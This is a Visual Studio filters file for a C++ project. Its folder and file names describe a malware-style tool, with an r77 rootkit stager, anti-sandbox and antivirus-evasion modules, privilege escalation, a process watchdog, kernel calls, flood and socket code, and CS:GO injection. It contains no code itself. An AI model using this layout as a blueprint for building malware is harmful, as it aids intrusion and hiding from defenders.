<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="源文件">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="头文件">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="资源文件">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="头文件\resource">
      <UniqueIdentifier>{6a6b527f-ae8c-4cc1-a0de-74e7324e832e}</UniqueIdentifier>
    </Filter>
    <Filter Include="头文件\resource\Encrytion">
      <UniqueIdentifier>{bb2390e9-3c27-4a08-a4de-db3490cf68ff}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\函数模块">
      <UniqueIdentifier>{340ca733-cc74-4212-8a1a-b98c4fb6fed6}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\主模块">
      <UniqueIdentifier>{f9bcb4cd-bd42-4f74-9dcf-22a0cb070683}</UniqueIdentifier>
    </Filter>
    <Filter Include="头文件\hie task Process">
      <UniqueIdentifier>{92142823-e8a6-406b-921a-4a2251b10608}</UniqueIdentifier>
    </Filter>
    <Filter Include="资源文件\hid Task Process">
      <UniqueIdentifier>{c31c4ef1-0f7e-4bbb-a669-af18ebf1c436}</UniqueIdentifier>
    </Filter>
    <Filter Include="资源文件\Attack">
      <UniqueIdentifier>{b6f6cc4a-faa0-47d8-83e9-55bfb9c89976}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\函数模块\hide System Project">
      <UniqueIdentifier>{dab5732c-cb23-459a-ac1c-43cf39f7a063}</UniqueIdentifier>
    </Filter>
    <Filter Include="头文件\hide System Project">
      <UniqueIdentifier>{0f471f85-b41f-4d73-ad1d-3b304e8f80bb}</UniqueIdentifier>
    </Filter>
    <Filter Include="资源文件\hide System Porject">
      <UniqueIdentifier>{6dc04036-afd0-40a0-8c83-5129f22144dc}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\函数模块\加密">
      <UniqueIdentifier>{8f42da04-8b5b-489c-843b-ff5e0bc13d27}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\函数模块\反沙箱">
      <UniqueIdentifier>{6c98876f-be3f-4c7a-b841-fd8e87f6bc35}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\函数模块\免杀提权">
      <UniqueIdentifier>{0282b52e-1763-4bbf-a0dd-076fc3d86e12}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\函数模块\连接/Socket套接字">
      <UniqueIdentifier>{ae34400d-8e0f-4be2-9e4d-eac586d7d942}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\函数模块\文件操作">
      <UniqueIdentifier>{aeaceb0b-fbfb-43d9-8958-0796a03055cd}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\函数模块\Other">
      <UniqueIdentifier>{901b8834-015f-45bb-8200-66f64ac14154}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\函数模块\R3调R0函数">
      <UniqueIdentifier>{1e1fc8b4-190c-4d78-b63b-1590359a1e42}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\函数模块\进程狗">
      <UniqueIdentifier>{9ba10661-655b-48ae-bdfd-75c13a433f5e}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\函数模块\查询">
      <UniqueIdentifier>{f1253306-930d-4caf-8ca3-052831216d88}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\函数模块\TCP&amp;UDP">
      <UniqueIdentifier>{e9710a3b-7787-41d2-9f9e-2c510d66c75b}</UniqueIdentifier>
    </Filter>
    <Filter Include="头文件\Flood">
      <UniqueIdentifier>{69216f80-298f-4892-ad90-2ba22f4b3822}</UniqueIdentifier>
    </Filter>
    <Filter Include="头文件\Socket">
      <UniqueIdentifier>{3d26e786-1fa9-4572-a273-0e10cdfaf944}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\函数模块\Socket">
      <UniqueIdentifier>{9f07b0b8-81e2-471b-babb-a97d7ce90aaa}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\函数模块\加密连接">
      <UniqueIdentifier>{a7ee2a1f-cf8d-4a3a-a952-52a9219935da}</UniqueIdentifier>
    </Filter>
    <Filter Include="头文件\Encoding">
      <UniqueIdentifier>{72533af7-41d2-4bff-be1f-e77fd253279a}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\函数模块\Injection">
      <UniqueIdentifier>{40ae85be-b1db-46c9-b0c7-aa2430e8623c}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\函数模块\Injection\CS:GO">
      <UniqueIdentifier>{5b521c73-8f1d-471a-915b-5d89415fcff4}</UniqueIdentifier>
    </Filter>
    <Filter Include="资源文件\CSGO-Hacker">
      <UniqueIdentifier>{ad3f7e81-65a3-4660-bd12-f7832c5022ae}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="control.cpp">
      <Filter>源文件\主模块</Filter>
    </ClCompile>
    <ClCompile Include="hand file\r77\r77 hand\Install.cpp">
      <Filter>源文件\函数模块\hide System Project</Filter>
    </ClCompile>
    <ClCompile Include="hand file\r77\r77 hand\r77api.cpp">
      <Filter>源文件\函数模块\hide System Project</Filter>
    </ClCompile>
    <ClCompile Include="Encryption.cpp">
      <Filter>源文件\函数模块\加密</Filter>
    </ClCompile>
    <ClCompile Include="Anti sendbox.cpp">
      <Filter>源文件\函数模块\反沙箱</Filter>
    </ClCompile>
    <ClCompile Include="Bypass.cpp">
      <Filter>源文件\函数模块\免杀提权</Filter>
    </ClCompile>
    <ClCompile Include="Connect.cpp">
      <Filter>源文件\函数模块\连接/Socket套接字</Filter>
    </ClCompile>
    <ClCompile Include="file_operation.cpp">
      <Filter>源文件\函数模块\文件操作</Filter>
    </ClCompile>
    <ClCompile Include="Funtions.cpp">
      <Filter>源文件\函数模块\Other</Filter>
    </ClCompile>
    <ClCompile Include="kernel.cpp">
      <Filter>源文件\函数模块\R3调R0函数</Filter>
    </ClCompile>
    <ClCompile Include="search_regedit_information.cpp">
      <Filter>源文件\函数模块\查询</Filter>
    </ClCompile>
    <ClCompile Include="Socket_Tcp_Server.cpp">
      <Filter>源文件\函数模块\连接/Socket套接字</Filter>
    </ClCompile>
    <ClCompile Include="hand file\Encoding\URLEncoding.cpp">
      <Filter>源文件\函数模块\加密连接</Filter>
    </ClCompile>
    <ClCompile Include="CSGO_Injection.cpp">
      <Filter>源文件\函数模块\Injection\CS:GO</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="API.h">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="Un-main.h">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="resource\Encryption\aes_transfer.h">
      <Filter>头文件\resource\Encrytion</Filter>
    </ClInclude>
    <ClInclude Include="resource\Encryption\aes_pre.h">
      <Filter>头文件\resource\Encrytion</Filter>
    </ClInclude>
    <ClInclude Include="resource.h">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="resource\内核\MinHook.h">
      <Filter>头文件\hie task Process</Filter>
    </ClInclude>
    <ClInclude Include="hand file\r77\r77 hand\Install.h">
      <Filter>头文件\hide System Project</Filter>
    </ClInclude>
    <ClInclude Include="hand file\r77\r77 hand\ntdll.h">
      <Filter>头文件\hide System Project</Filter>
    </ClInclude>
    <ClInclude Include="hand file\r77\r77 hand\r77api.h">
      <Filter>头文件\hide System Project</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="0x7E9FB-net.rc">
      <Filter>资源文件</Filter>
    </ResourceCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="file\ProcessHide.dll">
      <Filter>资源文件\hid Task Process</Filter>
    </None>
    <None Include="file\libuv.dll">
      <Filter>资源文件\Attack</Filter>
    </None>
    <None Include="hand file\r77\exe file\InstallStager.exe">
      <Filter>资源文件\hide System Porject</Filter>
    </None>
    <None Include="file\dxgi.dll">
      <Filter>资源文件\Attack</Filter>
    </None>
    <None Include="file\lFcGdB.dll">
      <Filter>资源文件\CSGO-Hacker</Filter>
    </None>
  </ItemGroup>
  <ItemGroup>
    <Library Include="resource\内核\libMinHook.x64.lib">
      <Filter>资源文件\hid Task Process</Filter>
    </Library>
  </ItemGroup>
</Project>